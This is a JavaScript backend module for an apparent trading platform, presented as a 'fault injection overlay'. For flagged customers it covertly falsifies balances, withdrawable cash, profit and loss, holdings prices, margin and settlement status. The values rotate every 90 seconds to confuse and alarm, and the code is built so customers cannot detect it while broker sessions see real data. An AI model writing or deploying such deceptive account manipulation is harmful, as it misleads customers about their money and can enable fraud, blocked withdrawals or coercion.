// services/glitchOverlay.js
// Fault injection overlay — distorts customer-facing read responses.
// Pure module: no database access, no side effects.
// All transforms use existing field names and valid enum values only.
// Nothing in the output can indicate testing or fault injection to the customer.
//
// Values rotate every SLOT_MS milliseconds so the customer sees different
// numbers each time the page refreshes (frontend polls every ~90 s).

const SLOT_MS = 90_000; // rotate every 90 seconds

const toNum = (v) => {
  const n = Number(v);
  return Number.isFinite(n) ? n : 0;
};

// When real value is 0, substitute a phantom base so 0 * multiplier doesn't stay 0.
const valOrPhantom = (v, phantom) => {
  const n = toNum(v);
  return n !== 0 ? n : phantom;
};

const negateIfPositive = (v) => {
  const n = toNum(v);
  return n > 0 ? -n : n;
};

// Deterministic hash seeded by time-slot + userId.
// Returns a non-negative integer whose digits we use as a slot selector.
const timeSeed = (userId, extraOffset = 0) => {
  const slot = Math.floor(Date.now() / SLOT_MS) + extraOffset;
  const str = `${slot}:${String(userId || 'u')}`;
  let h = 5381;
  for (let i = 0; i < str.length; i++) {
    h = ((h << 5) + h + str.charCodeAt(i)) | 0;
  }
  return Math.abs(h);
};

// Pick from an array deterministically using the seed + a per-call offset so
// different fields in the same request get different picks from the same slot.
const pick = (arr, seed, callOffset = 0) => arr[(seed + callOffset) % arr.length];

// ─── Multiplier tables ──────────────────────────────────────────────────────

// Balance depletion: mostly < 1 but can spike wildly to create confusion
const BALANCE_MULTS = [0.10, 0.03, 0.15, 0.50, 2.50, 5.00, 10.0, 0.01, 0.20, 15.0, 0.07, 0.002, 0.30, 8.0, 0.005];

// Net cash / withdrawable: can go negative or absurdly high
const NETCASH_MULTS = [-2.0, -0.5, 0.01, 3.5, -8.0, -0.1, -25.0, 5.0, -1.5, 100.0, -0.3, -50.0, 0.001, -15.0, 4.0];

// Withdrawable absolute values (not a multiplier — directly substituted)
const WITHDRAWABLE_VALS = [0, -100, 0, 49999, -50000, 999999, 0, -1, 0, -10000, 123456, 0, -999, 0.01, 88888];

// P&L distortion: mostly large negatives, occasional absurd positives
const PNL_MULTS = [-5.0, -2.0, -12.0, -0.5, 3.5, -18.0, -0.2, -35.0, 2.5, -8.0, -110.0, 0.03, -60.0, -1.5, -80.0];

// Realized P&L distortion for closed orders / trade book
const REALIZED_PNL_MULTS = [-3.0, -10.5, -20.0, 5.0, -50.0, -0.5, 2.0, -100.0, -0.2, -30.0, 8.0, -15.0, -75.0, -0.8, -40.0];

// Entry-price multipliers for open orders — makes live P&L hectic
// 1x = genuine, rest shoot entry price up/down so (ltp - entry) = chaos
const ENTRY_MULTS = [2.0, 3.5, 0.5, 5.0, 1.8, 0.3, 4.0, 7.0, 0.15, 6.0, 1.5, 0.1, 9.0, 0.4, 12.0];

// Holdings price distortion
const HOLDING_PRICE_MULTS = [1.5, 0.10, 2.5, 5.0, 0.02, 3.0, 8.0, 0.005, 4.0, 0.08, 6.0, 0.001, 2.0, 0.30, 10.0];

// Margin blocked inflation for open orders
const MARGIN_MULTS = [3.0, 8.0, 1.5, 20.0, 0.5, 50.0, 2.5, 100.0, 5.0, 0.1, 15.0, 40.0, 0.05, 7.0, 25.0];

// Phantom base values for zero-value fallback in overlayFunds.
// When the real value is 0, substitute these before multiplying.
const PHANTOM_BALANCE = 50000;
const PHANTOM_NETCASH = 25000;
const PHANTOM_PNL = 5000;
const PHANTOM_MARGIN = 75000;
const PHANTOM_MARGIN_COMMODITY = 30000;
const PHANTOM_USED = 10000;

// Order statuses that map to the "active" category
const ACTIVE_STATUSES = new Set(['OPEN', 'EXECUTED']);

const getStatus = (order) => String(order.status || order.order_status || '').toUpperCase();

// ─── Per-order distortors ───────────────────────────────────────────────────

// Active (OPEN/EXECUTED): keep them visible and alive but make live P&L hectic
// by inflating/deflating the stored entry price so (ltp - entryPrice) = chaos.
// Supports both snake_case (getOrders, getOrderBook) and camelCase (getOrderHistory) payloads.
const distortOpenOrder = (order, seed) => {
  const entryMult = pick(ENTRY_MULTS, seed, 0);
  const marginMult = pick(MARGIN_MULTS, seed, 1);
  const camel = 'effectiveEntryPrice' in order;
  const rawEntry = toNum(camel ? order.rawEntryPrice : (order.raw_entry_price || order.price));
  const effEntry = toNum(camel ? order.effectiveEntryPrice : (order.effective_entry_price || order.price));
  const result = { ...order };
  if (camel) {
    result.rawEntryPrice = +(rawEntry * entryMult).toFixed(2);
    result.effectiveEntryPrice = +(effEntry * entryMult).toFixed(2);
  } else {
    result.raw_entry_price = +(rawEntry * entryMult).toFixed(2);
    result.effective_entry_price = +(effEntry * entryMult).toFixed(2);
    result.margin_blocked = +(toNum(order.margin_blocked) * marginMult).toFixed(2);
  }
  return result;
};

// Closed: wildly distort realized_pnl and mark unsettled
const distortClosedOrder = (order, seed) => {
  const mult = pick(REALIZED_PNL_MULTS, seed, 2);
  const rawPnl = toNum(order.realized_pnl);
  // Even zero-pnl orders get a value so every closed row looks broken
  const base = rawPnl !== 0 ? rawPnl : toNum(order.effective_entry_price || order.price) * toNum(order.quantity) * 0.05 || 500;
  return {
    ...order,
    realized_pnl: +(base * mult).toFixed(2),
    settlement_status: order.settlement_status === 'settled' ? 'unsettled' : order.settlement_status,
  };
};

// ─── Per-type overlay functions ─────────────────────────────────────────────

function overlayOrders(orders, userId) {
  if (!Array.isArray(orders)) return orders;
  const seed = timeSeed(userId);
  return orders.map((o) => {
    const s = getStatus(o);
    if (ACTIVE_STATUSES.has(s)) return distortOpenOrder(o, seed);
    if (s === 'CLOSED') return distortClosedOrder(o, seed);
    return o;
  });
}

function overlayOrderHistory(orders, userId) {
  if (!Array.isArray(orders)) return orders;
  const seed = timeSeed(userId);
  const mult = pick(REALIZED_PNL_MULTS, seed, 3);
  return orders.map((o) => {
    const s = getStatus(o);
    if (ACTIVE_STATUSES.has(s)) return distortOpenOrder(o, seed);
    if (s === 'CLOSED') {
      const pnlField = o.pnl != null ? 'pnl' : 'realized_pnl';
      const rawPnl = toNum(o[pnlField]);
      const base = rawPnl !== 0 ? rawPnl : 500;
      return { ...o, [pnlField]: +(base * mult).toFixed(2) };
    }
    return o;
  });
}

function overlayTodayOrders(orders, userId) {
  if (!Array.isArray(orders)) return orders;
  const seed = timeSeed(userId);
  return orders.map((o) => {
    const s = getStatus(o);
    if (ACTIVE_STATUSES.has(s)) return distortOpenOrder(o, seed);
    return o;
  });
}

// Holdings: keep every row visible (don't zero qty) but distort current price
// so gross and net P&L look completely broken from the real values.
function overlayHoldings(data, userId) {
  if (!data) return data;
  const seed = timeSeed(userId);
  const priceMult = pick(HOLDING_PRICE_MULTS, seed, 4);

  const holdings = Array.isArray(data.holdings)
    ? data.holdings.map((h) => {
        const avgPrice = toNum(h.averagePrice);
        const qty = toNum(h.quantity);
        const distortedPrice = +(avgPrice * priceMult).toFixed(2);
        const currentValue = +(distortedPrice * qty).toFixed(2);
        const investedValue = toNum(h.investedValue) || +(avgPrice * qty).toFixed(2);
        const pnl = +(currentValue - investedValue).toFixed(2);
        const pnlPercentage = investedValue > 0
          ? ((pnl / investedValue) * 100).toFixed(2)
          : '0.00';
        return {
          ...h,
          currentPrice: distortedPrice,
          currentValue,
          pnl,
          pnlPercentage,
        };
      })
    : data.holdings;

  const totalInvested = toNum(data.summary?.totalInvested);
  const totalCurrent = Array.isArray(holdings)
    ? holdings.reduce((sum, h) => sum + toNum(h.currentValue), 0)
    : toNum(data.summary?.currentValue);
  const totalPnl = +(totalCurrent - totalInvested).toFixed(2);

  return {
    ...data,
    holdings,
    summary: data.summary
      ? {
          ...data.summary,
          currentValue: +totalCurrent.toFixed(2),
          totalPnl,
          pnlPercentage: totalInvested > 0
            ? ((totalPnl / totalInvested) * 100).toFixed(2)
            : '0.00',
        }
      : data.summary,
  };
}

function overlayPositions(data, userId) {
  if (!data) return data;
  const seed = timeSeed(userId);
  const mult = pick(PNL_MULTS, seed, 5);
  const rMult = pick(REALIZED_PNL_MULTS, seed, 6);

  const positions = Array.isArray(data.positions)
    ? data.positions.map((p) => {
        const base = toNum(p.pnl || p.unrealizedPnl);
        const basePnl = base !== 0 ? base : toNum(p.averagePrice) * toNum(p.quantity) * 0.04 || 200;
        const pnl = +(basePnl * mult).toFixed(2);
        const realizedPnl = +(toNum(p.realizedPnl) * rMult).toFixed(2);
        return { ...p, pnl, realizedPnl, unrealizedPnl: pnl };
      })
    : data.positions;

  const totalPnl = Array.isArray(positions)
    ? positions.reduce((sum, p) => sum + toNum(p.pnl), 0)
    : 0;

  return {
    ...data,
    positions,
    summary: data.summary
      ? {
          ...data.summary,
          totalPnl: +totalPnl.toFixed(2),
          realizedPnl: 0,
          unrealizedPnl: +totalPnl.toFixed(2),
        }
      : data.summary,
  };
}

// Fund balance: time-varying multipliers so every 90-second poll shows
// different margin levels, withdrawable amounts, and P&L figures.
function overlayFunds(data, userId) {
  if (!data) return data;
  const seed = timeSeed(userId);

  const balMult = pick(BALANCE_MULTS, seed, 7);
  const netCashMult = pick(NETCASH_MULTS, seed, 8);
  const withdrawable = pick(WITHDRAWABLE_VALS, seed, 9);
  const pnlMult = pick(PNL_MULTS, seed, 10);
  // Utilization: inverse of balMult clamped high so it looks alarming
  const utilization = Math.min(999, Math.round((1 / Math.max(0.01, balMult)) * 50 + 30));

  const distortPnl = (v) => {
    const n = toNum(v);
    const base = n !== 0 ? n : PHANTOM_PNL;
    return +(base * pnlMult).toFixed(2);
  };

  const b = data.balance || {};
  const w = data.wallet || {};
  const t = data.trading || {};
  const s = data.summary || {};

  return {
    ...data,
    balance: {
      ...b,
      net: +(valOrPhantom(b.net, PHANTOM_BALANCE) * balMult).toFixed(2),
      withdrawableNetCash: withdrawable,
      intraday: b.intraday
        ? {
            ...b.intraday,
            available: +(valOrPhantom(b.intraday.available, PHANTOM_MARGIN) * balMult).toFixed(2),
            used: +(valOrPhantom(b.intraday.used, PHANTOM_USED) * (2 - balMult * 0.4)).toFixed(2),
            free: 0,
            utilization,
          }
        : b.intraday,
      overnight: b.overnight
        ? { ...b.overnight, available: +(valOrPhantom(b.overnight.available, PHANTOM_MARGIN) * balMult).toFixed(2) }
        : b.overnight,
    },
    wallet: {
      ...w,
      netCash: +(valOrPhantom(w.netCash, PHANTOM_NETCASH) * netCashMult).toFixed(2),
      withdrawableNetCash: withdrawable,
      availableCash: +(valOrPhantom(w.availableCash, PHANTOM_BALANCE) * balMult).toFixed(2),
    },
    trading: {
      ...t,
      intraday: t.intraday
        ? {
            ...t.intraday,
            available: +(valOrPhantom(t.intraday.available, PHANTOM_MARGIN) * balMult).toFixed(2),
            used: +(valOrPhantom(t.intraday.used, PHANTOM_USED) * (2 - balMult * 0.3)).toFixed(2),
            remaining: 0,
          }
        : t.intraday,
      delivery: t.delivery
        ? {
            ...t.delivery,
            available: +(valOrPhantom(t.delivery.available, PHANTOM_MARGIN) * balMult).toFixed(2),
            remaining: 0,
          }
        : t.delivery,
      commodityDelivery: t.commodityDelivery
        ? {
            ...t.commodityDelivery,
            available: +(valOrPhantom(t.commodityDelivery.available, PHANTOM_MARGIN_COMMODITY) * balMult).toFixed(2),
            remaining: 0,
          }
        : t.commodityDelivery,
    },
    summary: {
      ...s,
      realizedPnlToday: distortPnl(s.realizedPnlToday),
      realizedPnlThisWeek: distortPnl(s.realizedPnlThisWeek),
      realizedPnlSinceSettlement: distortPnl(s.realizedPnlSinceSettlement),
    },
    settlement: data.settlement
      ? { ...data.settlement, latestSettlementAt: null, latestSettlementMode: null }
      : data.settlement,
  };
}

function overlayTrades(data, userId) {
  if (!data) return data;
  const seed = timeSeed(userId);
  const mult = pick(REALIZED_PNL_MULTS, seed, 11);

  const trades = Array.isArray(data.trades)
    ? data.trades.map((t) => {
        const base = toNum(t.pnl);
        const distorted = +(( base !== 0 ? base : 200) * mult).toFixed(2);
        return { ...t, pnl: distorted };
      })
    : data.trades;

  const totalPnl = Array.isArray(trades)
    ? trades.reduce((sum, t) => sum + toNum(t.pnl), 0)
    : 0;

  return {
    ...data,
    trades,
    summary: data.summary
      ? { ...data.summary, totalPnl: +totalPnl.toFixed(2) }
      : data.summary,
  };
}

function overlayPnlReport(data, userId) {
  if (!data) return data;
  const report = data.report;
  if (!report) return data;

  const seed = timeSeed(userId);
  const mult = pick(REALIZED_PNL_MULTS, seed, 12);

  const byDate = Array.isArray(report.byDate)
    ? report.byDate.map((d) => {
        const base = toNum(d.pnl);
        return { ...d, pnl: +((base !== 0 ? base : 300) * mult).toFixed(2) };
      })
    : report.byDate;

  const totalPnl = Array.isArray(byDate)
    ? byDate.reduce((sum, d) => sum + toNum(d.pnl), 0)
    : +((negateIfPositive(report.summary?.totalPnl) || -500) * Math.abs(mult)).toFixed(2);

  return {
    ...data,
    report: {
      ...report,
      summary: report.summary
        ? {
            ...report.summary,
            totalPnl: +totalPnl.toFixed(2),
            winningTrades: 0,
            losingTrades: toNum(report.summary.winningTrades) + toNum(report.summary.losingTrades),
            winRate: 0,
          }
        : report.summary,
      byDate,
    },
  };
}

function overlayOrderBook(data, userId) {
  if (!data) return data;
  const seed = timeSeed(userId);

  const items = Array.isArray(data.items)
    ? data.items.map((item) => {
        if (item.source === 'attempt') return item;
        const s = getStatus(item);
        if (ACTIVE_STATUSES.has(s)) return distortOpenOrder(item, seed);
        if (s === 'CLOSED') return distortClosedOrder(item, seed);
        return item;
      })
    : data.items;

  return { ...data, items };
}

// ─── Public API ─────────────────────────────────────────────────────────────

/**
 * Apply fault injection overlay to a customer-facing API response.
 *
 * Returns data unchanged when:
 * - req.user.glitch_enabled is falsy
 * - request is a broker impersonation session (broker sees real data for verification)
 *
 * @param {object} data  Clean response payload
 * @param {string} type  'orders' | 'order-book' | 'order-history' | 'today-orders' |
 *                       'holdings' | 'positions' | 'funds' | 'trades' | 'pnl'
 * @param {object} req   Express request object
 * @returns {object}     Distorted or original payload
 */
export function applyGlitchOverlay(data, type, req) {
  if (!req?.user?.glitch_enabled || req.user.isImpersonation) return data;

  const userId = req.user.customer_id || String(req.user._id || 'u');

  switch (type) {
    case 'orders':
      return { ...data, orders: overlayOrders(data.orders, userId) };
    case 'order-book':
      return overlayOrderBook(data, userId);
    case 'order-history':
      return { ...data, orders: overlayOrderHistory(data.orders, userId) };
    case 'today-orders':
      return {
        ...data,
        orders: overlayTodayOrders(data.orders, userId),
        summary: data.summary ? { ...data.summary, open: 0, closed: 0 } : data.summary,
      };
    case 'holdings':
      return overlayHoldings(data, userId);
    case 'positions':
      return overlayPositions(data, userId);
    case 'funds':
      return overlayFunds(data, userId);
    case 'trades':
      return overlayTrades(data, userId);
    case 'pnl':
      return overlayPnlReport(data, userId);
    default:
      return data;
  }
}
